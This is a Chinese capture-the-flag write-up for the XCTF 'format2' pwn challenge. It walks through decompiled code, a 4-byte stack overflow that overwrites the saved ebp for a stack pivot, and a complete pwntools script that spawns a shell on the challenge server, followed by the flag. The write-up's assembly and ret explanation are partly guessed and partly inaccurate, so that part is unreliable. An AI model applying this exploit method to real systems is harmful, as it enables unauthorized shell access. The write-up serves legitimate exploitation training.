# format2

[题目地址](https://adworld.xctf.org.cn/challenges/details?hash=5756e556-806f-4144-82f6-0b1183e9a0a0_2&task_category_id=2)

看到题目我以为是个格式化字符串，结果是栈溢出。

不知道为啥，附件给的程序ghidra反编译了很久，还好有用的部分不多。

```c
undefined4 main(void)
{
  bool bVar1;
  undefined3 extraout_var;
  void *local_38;
  char local_32 [30];
  uint local_14;
  memset(local_32,0,0x1e);
  setvbuf((FILE *)stdout,(char *)0x0,2,0);
  setvbuf((FILE *)stdin,(char *)0x0,1,0);
  printf("Authenticate : ");
  __isoc99_scanf("%30s");
  memset(input,0,12);
  local_38 = (void *)0x0;
  local_14 = Base64Decode(local_32,&local_38);
  if (local_14 < 13) {
    memcpy(input,local_38,local_14);
    bVar1 = auth(local_14);
    if (CONCAT31(extraout_var,bVar1) == 1) {
      correct();
    }
  }
  else {
    puts("Wrong Length");
  }
  return 0;
}
```

目标肯定是那个correct函数了。往上看，要求auth函数返回1。看看是啥。

```c
bool auth(size_t param_1)
{
  int iVar1;
  undefined local_18 [8];
  char *local_10;
  undefined auStack12 [8];
  memcpy(auStack12,input,param_1);
  local_10 = (char *)calc_md5(local_18,0xc);
  printf("hash : %s\n",local_10);
  iVar1 = strcmp("f87cd601aa7fedca99018a8be88eda34",local_10);
  return iVar1 == 0;
}
```

calc_md5不用进去看了，肯定是md5加密的，无法逆向。虽然得到了期望值的md5,但是碰撞还是很难的。不如仔细看看传进这个函数里的值是什么。param_1在main函数中对应local_14,local_14应该是我们的输入base64解密后的长度，最大12。12？再回到auth，发现有一句memcpy(auStack12,input,param_1);。auStack12长度为8，意味着memcpy拷贝过去后有4字节会溢出。到了本题的关键点了。

假如我们可以溢出8个字节，这题就非常简单了。因为程序中有现成的后门函数，就是correct。

```c
void correct(void)
{
  if (input._0_4_ == -0x21524111) {
    puts("Congratulation! you are good!");
    system("/bin/sh");
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

溢出8个字节可以直接覆盖返回地址，但溢出4个字节只能覆盖ebp。平时我们都是直接扔掉ebp，填充一些垃圾字节，但这道题有大用处。一个关于汇编的小问题：这个在栈上的ebp是谁的？不是auth的，因为auth自己的ebp目前被寄存器ebp存着（注意栈上的ebp只是个值，不是寄存器），因此栈上的ebp是main的。合理，因为在函数执行结束后要把调用函数的ebp复原，故把值存在栈上。看一下函数头和尾的汇编代码就能知道了。

- push ebp  
mov esp,ebp  
sub esp,0x28

- mov esp,ebp  
pop ebp 

因此把栈上存的ebp覆盖后其实改变的是main函数的ebp。当main函数执行完后，返回调用retn指令，相当于call [ebp + 4]（这点我不确定，猜的，似乎搜不到详细内容）。那我们可以这么构造12个字节的payload：4个无用字符+system地址+input地址。input地址会被溢出到ebp，返回时返回到input地址+4，也就是system地址，成功getshell。

```python
from base64 import b64encode
from pwn import *
p=remote("61.147.171.105",53878)
system_addr=0x0804927f
input_addr=0x0811eb40
payload=b'a'*4+p32(system_addr)+p32(input_addr)
p.sendlineafter("Authenticate : ",b64encode(payload))
p.interactive()
```

system_addr注意不要直接抄system执行那句，要把传入参数的那些汇编代码也包括上，多包括一句也行。

- ### Flag
  > cyberpeace{a18ddd53b06425a34598649e0a2253d9}